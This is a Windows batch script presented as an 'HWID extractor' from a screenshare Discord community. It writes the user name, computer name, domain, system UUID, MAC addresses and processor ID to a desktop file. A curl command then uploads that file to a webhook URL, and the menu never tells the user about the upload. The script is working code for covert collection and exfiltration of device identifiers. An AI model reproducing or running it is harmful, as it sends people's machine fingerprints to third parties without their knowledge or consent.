#Performed by Screenshare Community! discord.gg/screenshare
#RRR#0001


::::::::::::::::::::::::::::::::::::::::::::::::: Profile ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

:Profile

cls
@echo off
goto :Menu

::::::::::::::::::::::::::::::::::::::::::::::::: Menu :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::


:Menu
Title HWID extractor

color 0E
echo.
echo                        .,-:::::/  .,::::::::: :::::::::      ::   .: .::    .   .::::: ::::::::-.  
echo                        ,;;-'````'   ;;;;''''; ;;;;;;;''''     ,;;   ;;,';;,  ;;  ;;;'  ;;; ;;,   `';,
echo                        [[[   [[[[[ [/[[cccc       [[         ,[[[,,,[[[ '[[, [[, [['   [[[ `[[     [[
echo                        $$c.    "$$  $$""""       $$         "$$$"""$$$   Y$c$$$c$P    $$$  $$,    $$
echo                         Y8bo,,,o88o 888oo,--     88,         888   "88o   "88"888     888  888-,o8P'
echo                        `'YMUP"YMM"" ""YUMMM    MMM          MMM    YMM    "M "M"     MMM  MMMMP"`  
echo.
echo.              
echo                                               [ 1 ] - HWID extractor
echo                                               [ 2 ] - quit
echo.
SET WEBHOOK_URL=Webhook url
set /p input=[Option] :
if /i "%input%" equ "1" goto Hwid
if /i "%input%" equ "2" goto exit

::::::::::::::::::::::::::::::::::::::::::::::::: Hwid :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

:Hwid

md %USERPROFILE%\Desktop\Resultados
cd %USERPROFILE%\Desktop\Resultados

echo User Name       : %UserName% > %USERPROFILE%\Desktop\Resultados\HWID.txt
echo Computer Name   : %ComputerName% >> %USERPROFILE%\Desktop\Resultados\HWID.txt
echo User Domain     : %UserDomain% >> %USERPROFILE%\Desktop\Resultados\HWID.txt

goto :other
:other
Powershell "wmic path win32_computersystemproduct get uuid" >> %USERPROFILE%\Desktop\Resultados\"HWID.txt"
Powershell "getmac" >> %USERPROFILE%\Desktop\Resultados\"HWID.txt"
Powershell "Get-WmiObject -Class Win32_Processor -ComputerName. | Select-Object -Property ProcessorId*" >> %USERPROFILE%\Desktop\Resultados\"HWID.txt"
cd "%USERPROFILE%\Desktop\Resultados\"
curl -H "Accept: application/json" -H "Content-Type:multipart/form-data" -X POST -F "file=@HWID.txt" -F "payload_json={\"content\":\"%UserName% HWID\"}" %WEBHOOK_URL%
cls
echo Done.
pause
start %USERPROFILE%\Desktop\Resultados\"HWID.txt"
cls
goto :menu

::::::::::::::::::::::::::::::::::::::::::::::::: Exit :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:exit
